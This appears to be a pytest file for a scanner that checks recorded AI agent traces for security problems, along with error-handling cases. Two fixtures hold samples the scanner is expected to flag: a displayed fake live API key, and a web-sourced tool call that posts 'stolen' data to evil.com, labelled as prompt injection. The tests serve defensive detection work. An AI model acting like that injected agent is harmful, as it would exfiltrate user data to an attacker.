import json
import os
import tempfile

from pentestai.cli import main


def test_agent_scan_clean_trace():
    trace = {
        "user_turns": [{"content": "list files", "step": 0}],
        "tool_calls": [
            {"name": "fs.list", "arguments": {"path": "."}, "ok": True, "step": 1, "source": "user"}
        ],
        "target": "test-agent"
    }
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(trace, f)
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 0
    finally:
        os.unlink(tmp_path)


def test_agent_scan_with_confirmed_finding():
    trace = {
        "user_turns": [{"content": "show data", "step": 0}],
        "tool_calls": [
            {"name": "display", "arguments": {"text": "api_key=sk_live_abc123def456ghi789jkl012"}, "ok": True, "step": 1, "source": "user"},
            {"name": "display", "arguments": {"text": "safe output"}, "ok": True, "step": 2, "source": "user"}
        ],
        "target": "test-agent"
    }
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(trace, f)
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 1
    finally:
        os.unlink(tmp_path)


def test_agent_scan_json_output():
    trace = {
        "user_turns": [{"content": "read data", "step": 0}],
        "tool_calls": [
            {"name": "fs.list", "arguments": {"path": "."}, "ok": True, "step": 1, "source": "user"}
        ],
        "target": "test-agent"
    }
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(trace, f)
        trace_path = f.name
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        output_path = f.name
    try:
        main(["agent-scan", trace_path, "-o", output_path])
        with open(output_path, encoding="utf-8") as f:
            report = json.load(f)
        assert isinstance(report, (dict, list))
    finally:
        os.unlink(trace_path)
        if os.path.exists(output_path):
            os.unlink(output_path)


def test_agent_scan_prompt_injection_detected():
    trace = {
        "user_turns": [{"content": "browse web", "step": 0}],
        "tool_calls": [
            {"name": "http.post", "arguments": {"url": "http://evil.com", "data": "stolen"}, "ok": True, "step": 1, "source": "web"}
        ],
        "target": "test-agent"
    }
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(trace, f)
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 1
    finally:
        os.unlink(tmp_path)


def test_agent_scan_multiple_traces():
    traces = [
        {
            "user_turns": [{"content": "task 1", "step": 0}],
            "tool_calls": [{"name": "fs.list", "arguments": {"path": "."}, "ok": True, "step": 1, "source": "user"}],
            "target": "agent-1"
        },
        {
            "user_turns": [{"content": "task 2", "step": 0}],
            "tool_calls": [{"name": "fs.list", "arguments": {"path": "/tmp"}, "ok": True, "step": 1, "source": "user"}],
            "target": "agent-2"
        }
    ]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(traces, f)
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 0
    finally:
        os.unlink(tmp_path)


def test_agent_scan_missing_file():
    result = main(["agent-scan", "/nonexistent/path/trace.json"])
    assert result == 2


def test_agent_scan_invalid_json():
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        f.write("this is not valid json {{{")
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 2
    finally:
        os.unlink(tmp_path)


def test_agent_scan_invalid_type():
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump("just a string", f)
        tmp_path = f.name
    try:
        result = main(["agent-scan", tmp_path])
        assert result == 2
    finally:
        os.unlink(tmp_path)
